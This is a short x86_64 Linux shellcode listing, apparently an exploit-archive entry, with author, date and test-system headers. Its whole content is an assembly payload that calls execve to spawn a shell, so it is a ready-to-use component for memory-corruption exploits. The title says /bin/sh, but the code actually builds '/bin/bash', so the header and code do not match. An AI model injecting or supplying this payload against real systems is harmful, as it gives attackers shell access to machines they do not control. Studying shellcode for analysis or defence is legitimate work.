
;Category: Shellcode
;Title: GNU/Linux x86_64 - execve /bin/sh
;Author: m4n3dw0lf
;Github: https://github.com/m4n3dw0lf
;Date: 14/06/2017
;Architecture: Linux x86_64
;Tested on : #1 SMP Debian 4.9.18-1 (2017-03-30) x86_64 GNU/Linux

global _start

section .text

_start:
	push rax
	xor rdx, rdx
	xor rsi, rsi
	push byte 'h'
	mov rbx,'/bin/bas'
	push rbx
	push rsp
	pop rdi
	mov al, 59
	syscall

